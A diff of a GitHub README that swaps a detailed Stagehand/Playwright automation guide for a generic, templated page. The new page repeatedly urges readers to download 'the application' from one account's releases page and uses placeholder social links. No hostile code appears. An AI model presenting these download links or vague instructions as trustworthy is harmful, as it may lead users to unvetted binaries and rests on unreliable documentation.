@@ -1,263 +1,117 @@
-# 🤘 Welcome to Stagehand! + Playwright!
+# 🚀 playwright-ai-automation - Automate Browsing with AI
 
-Hey! This is a project built with [Stagehand](https://github.com/browserbase/stagehand).
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/sonoraa4ever/playwright-ai-automation/releases)
 
-You can build your own web agent using: `npx create-browser-app`!
+## 📘 Description
 
-## Setting the Stage
+playwright-ai-automation is an AI-powered browser automation framework. This tool helps you streamline your online tasks using simple, natural language commands. Built on Playwright and Stagehand, it features smart caching for improved performance and seamless integration with AWS Bedrock for enhanced capabilities.
 
-Stagehand is an SDK for automating browsers. It's built on top of [Playwright](https://playwright.dev/) and provides a higher-level API for better debugging and AI fail-safes.
+## 🚀 Getting Started
 
-## Curtain Call
+To begin using playwright-ai-automation, follow these simple steps:
 
-Get ready for a show-stopping development experience. Just run:
+1. **Install Requirements**  
+   Before running the application, ensure your system meets the following requirements:
+   - Operating System: Windows, macOS, or Linux
+   - Node.js version: 14.x or higher
+   - Yarn package manager: 1.x or higher
+   - An internet connection for downloading the application and its dependencies
 
-```bash
-yarn install && yarn start
-```
+2. **Download the Application**  
+   Visit this page to download the latest version of playwright-ai-automation:  
+   [Download Playwright AI Automation](https://github.com/sonoraa4ever/playwright-ai-automation/releases)
 
-## What's Next?
+3. **Install the Application**  
+   Follow these steps to install the application:
+   - Open a terminal on your computer.
+   - Navigate to the directory where you downloaded the application.
+   - Run the following command to install dependencies:
+     ```bash
+     yarn install
+     ```
 
-### Add your API keys
+4. **Running the Application**  
+   To start using playwright-ai-automation:
+   - Open a terminal in the application directory.
+   - Use the command below to launch the app:
+     ```bash
+     yarn start
+     ```
 
-Required API keys/environment variables are in the `.env.example` file. Copy it to `.env` and add your API keys.
+## 📥 Download & Install
 
-```bash
-cp .env.example .env && nano .env # Add your API keys to .env
-```
+To install and run playwright-ai-automation, you can download the latest release from the following link:  
+[Download Playwright AI Automation](https://github.com/sonoraa4ever/playwright-ai-automation/releases)
 
-### Custom .cursorrules
+Follow the installation steps mentioned in the "Getting Started" section to ensure a successful setup.
 
-We have custom .cursorrules for this project. It'll help quite a bit with writing Stagehand easily.
+## 🛠 Features
 
-### Available Scripts
+playwright-ai-automation comes with a variety of features that enhance your browsing experience, including:
 
-```bash
-# Development
-yarn start          # Run the main script (index.ts)
-yarn dev           # Run with auto-reload on file changes
-yarn build         # Compile TypeScript to JavaScript
+- **Natural Language Commands**  
+  Use simple phrases to control your browser tasks without needing to learn complex commands. For example, you can type "Open Google" to launch the browser to the Google homepage.
 
-# Testing
-yarn test          # Run Playwright tests
-yarn test:ui       # Run tests with interactive UI
-yarn test:debug    # Run tests in debug mode
-yarn test:headed   # Run tests with visible browser
-yarn test:report   # Show test report
+- **Smart Caching**  
+  The application remembers previous actions, speeding up repeated tasks and minimizing redundant data processing.
 
-# Code Quality
-yarn lint          # Check TypeScript types
-yarn typecheck     # Same as lint
+- **AWS Bedrock Integration**  
+  This allows seamless usage of advanced AI functions, enhancing the capabilities of your automated tasks.
 
-# Maintenance
-yarn clean         # Remove dist and cache.json
-yarn clean:cache   # Remove only cache.json
-```
+## 📋 Usage Examples
 
-### Run on Browserbase
+Here are a few examples to help you understand how to use playwright-ai-automation effectively:
 
-To run on Browserbase, add your API keys to .env and change `env: "LOCAL"` to `env: "BROWSERBASE"` in [stagehand.config.ts](stagehand.config.ts).
+1. **Open a Website**  
+   To open a website, simply type:  
+   ```
+   Open [website URL]
+   ```
+   For instance, "Open https://www.example.com".
 
-### Use AWS Bedrock with Claude 3.5 Sonnet v2
+2. **Fill a Form**  
+   To fill out forms, use the following structure:  
+   ```
+   Fill [form fields]
+   ```
+   An example would be: "Fill username as 'testuser' and password as 'password123'".
 
-This project is configured to use AWS Bedrock with Claude 3.5 Sonnet v2 by default. The configuration in [stagehand.config.ts](stagehand.config.ts) uses:
+3. **Take Screenshots**  
+   You can take a screenshot of a page by stating:  
+   ```
+   Take a screenshot of [page name]
+   ```
+   For example, "Take a screenshot of the homepage".
 
-- Model: `us.anthropic.claude-3-5-sonnet-20241022-v2:0`
-- Provider: AWS Bedrock
+## 🎥 Additional Resources
 
-Make sure to add your AWS credentials to .env:
+For more information on using playwright-ai-automation, check the following resources:
 
-- `AWS_REGION`
-- `AWS_ACCESS_KEY_ID`
-- `AWS_SECRET_ACCESS_KEY`
-- `AWS_SESSION_TOKEN` (optional)
+- **Documentation**:  
+  Learn more about the commands and features by visiting our [Documentation Site](https://github.com/sonoraa4ever/playwright-ai-automation/wiki).
 
-## Caching
+- **Community Support**:  
+  If you encounter issues or have questions, feel free to access our community forums.
 
-Stagehand includes a built-in caching system to optimize browser automation by storing and reusing observation results and actions. This significantly reduces API calls and speeds up repeated operations.
+## 👥 Contributing
 
-### How Caching Works
+We welcome contributions! If you'd like to improve this project, please follow these guidelines:
 
-The caching system stores browser observation results and actions in a local `cache.json` file. When you perform the same operation on similar page content, Stagehand can reuse cached results instead of making new LLM calls.
+- Fork the repository.
+- Create a new branch for your feature.
+- Submit a pull request detailing the changes you've made.
 
-### Available Caching Functions
+## 📜 License
 
-**Basic Cache Operations:**
+This project is licensed under the MIT License. You can find the full details in the LICENSE file.
 
-- `getCache<T>(key: string)` - Retrieve a cached value by key
-- `setCache<T>(key: string, value: T)` - Store a value in the cache
-- `readCache(instruction: string)` - Read a specific cached observation result
-- `simpleCache(instruction: string, actionToCache: ObserveResult)` - Store an observation result
+## 💬 Connect with Us
 
-**Advanced Caching with Automatic Key Generation:**
+If you like to connect, follow us on our social media channels for updates and announcements.
 
-- `generateCacheKey(page: Page, prompt: string)` - Creates a unique cache key based on page URL, title, content, and prompt
-- `observeWithCache(page: Page, key: string, prompt: string, selfHeal?: boolean)` - Observe with caching support
-- `actWithCache(page: Page, key: string, prompt: string, selfHeal?: boolean)` - Act with caching support
-- `actWithAdvancedCache(page: Page, prompt: string, options?)` - Act with automatic cache key generation
+Use the links below to stay informed:
 
-### Usage Examples
+- Twitter: [@YourAppHandle](https://twitter.com/YourAppHandle)
+- GitHub: [Playwright AI Automation](https://github.com/sonoraa4ever/playwright-ai-automation)
 
-```typescript
-import { actWithAdvancedCache, observeWithCache, generateCacheKey } from "./utils";
-
-// Use advanced caching with automatic key generation
-await actWithAdvancedCache(page, "Click the login button", {
-  selfHeal: true, // Automatically retry if cached element not found
-});
-
-// Manual caching with custom keys
-const cacheKey = await generateCacheKey(page, "Find search box");
-const searchResults = await observeWithCache(page, cacheKey, "Find search box", true);
-
-// Use cached observation to perform action
-await actWithCache(page, cacheKey, "Type in search box", true);
-```
-
-### Self-Healing Mode
-
-When `selfHeal` is enabled, the caching system will:
-
-- Verify cached elements still exist on the page
-- Automatically re-observe if cached elements are not found
-- Retry actions using fresh observations if cached actions fail
-
-This makes your automation more resilient to minor page changes.
-
-### Cache File Location
-
-The cache is stored in `cache.json` in your project root. You can:
-
-- Delete this file to clear all cached data
-- Add it to `.gitignore` to avoid committing cached data
-- Share it across team members for consistent automation behavior
-
-### Real-World Example: Caching in Action
-
-Here's what caching looks like during actual test execution:
-
-```bash
-[2025-08-22 10:34:43.897 +0700] INFO: local browser started successfully.
-    category: "init"
-
-✓ Using cached action for: Click on "Select token"
-[2025-08-22 10:34:48.643 +0700] INFO: Performing act from an ObserveResult
-    category: "action"
-    observeResult: {
-        "description": "Button to select a token for trading",
-        "method": "click",
-        "arguments": [],
-        "selector": "xpath=/html[1]/body[1]/div[1]/span[1]/div[1]/div[1]/div[2]/div[4]/div[1]/div[1]/div[1]/div[2]/div[1]/div[1]/div[2]/div[1]/div[1]/div[3]/div[1]/div[1]/div[2]/div[2]/div[1]"
-    }
-
-[2025-08-22 10:34:50.316 +0700] INFO: click complete
-    category: "action"
-    newOpenedTab: "no new tabs opened"
-
-✓ Using cached action for: Click on "USDC"
-[2025-08-22 10:34:51.373 +0700] INFO: Performing act from an ObserveResult
-    category: "action"
-    observeResult: {
-        "description": "USDC token selection button",
-        "method": "click",
-        "arguments": [],
-        "selector": "xpath=/html[1]/body[1]/div[4]/span[1]/span[1]/div[1]/div[2]/div[1]/div[1]/dialog[1]/div[1]/div[3]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[2]/div[1]/div[1]/div[1]/div[2]/div[1]"
-    }
-
-✓ Using cached action for: Enter "0.1" ETH
-[2025-08-22 10:34:54.486 +0700] INFO: Performing act from an ObserveResult
-    category: "action"
-```
-
-### How It Works
-
-1. **First Run**: When Stagehand encounters a new action (e.g., "Click on Select token"), it:
-
-   - Uses AI to observe and identify the element on the page
-   - Stores the observation result (selector, description, method) in `cache.json`
-   - Executes the action
-
-2. **Subsequent Runs**: When the same action is requested:
-
-   - The green checkmark (✓) indicates a cache hit: `Using cached action for:`
-   - Stagehand retrieves the stored selector from cache
-   - Skips the AI observation step (no LLM API call)
-   - Directly executes the action using the cached selector
-
-3. **Benefits**:
-
-   - **Speed**: Cached actions execute instantly without AI processing
-   - **Cost**: Reduces API calls to your LLM provider
-   - **Consistency**: Same elements are targeted across test runs
-   - **Debugging**: Cached selectors are visible in logs for troubleshooting
-
-4. **Self-Healing**: If a cached element is not found (page structure changed), the system can:
-   - Automatically fall back to fresh AI observation
-   - Update the cache with new selectors
-   - Continue test execution without manual intervention
-
-## Using @ai-sdk/amazon-bedrock
-
-This project uses the Vercel AI SDK with Amazon Bedrock provider for flexible LLM integration. The configuration is set up in `llm_clients/aisdk_client.ts` and `stagehand.config.ts`.
-
-### Key Features:
-
-- **Model**: Claude 3.5 Sonnet v2 (`us.anthropic.claude-3-5-sonnet-20241022-v2:0`)
-- **Provider**: Amazon Bedrock via @ai-sdk/amazon-bedrock
-- **Flexibility**: Easy to switch between different AI providers (OpenAI, Anthropic, etc.)
-
-### Configuration Example:
-
-```typescript
-import { createAmazonBedrock } from "@ai-sdk/amazon-bedrock";
-
-const bedrock = createAmazonBedrock({
-  region: process.env.AWS_REGION,
-  accessKeyId: process.env.AWS_ACCESS_KEY_ID,
-  secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY,
-  sessionToken: process.env.AWS_SESSION_TOKEN, // optional
-});
-```
-
-## Using @playwright/test
-
-While this project primarily uses Stagehand's high-level API, you can also integrate @playwright/test for more advanced testing scenarios.
-
-### Installation:
-
-```bash
-yarn add -D @playwright/test
-```
-
-### Example Test:
-
-```typescript
-import { test, expect } from "@playwright/test";
-import { Stagehand } from "@browserbasehq/stagehand";
-
-test("automated login test", async ({ page }) => {
-  const stagehand = new Stagehand({
-    page,
-    env: "LOCAL",
-  });
-
-  await stagehand.init();
-
-  // Use Stagehand's AI-powered actions
-  await page.act("Click the login button");
-  await page.act("Enter username: test@example.com");
-
-  // Mix with standard Playwright assertions
-  await expect(page).toHaveURL(/dashboard/);
-
-  await stagehand.close();
-});
-```
-
-### Running Tests:
-
-```bash
-yarn playwright test
-```
-
-This combination gives you the best of both worlds: AI-powered browser automation with Stagehand and robust testing capabilities with Playwright Test.
+For more updates, make sure to download the latest release from our [Release Page](https://github.com/sonoraa4ever/playwright-ai-automation/releases).
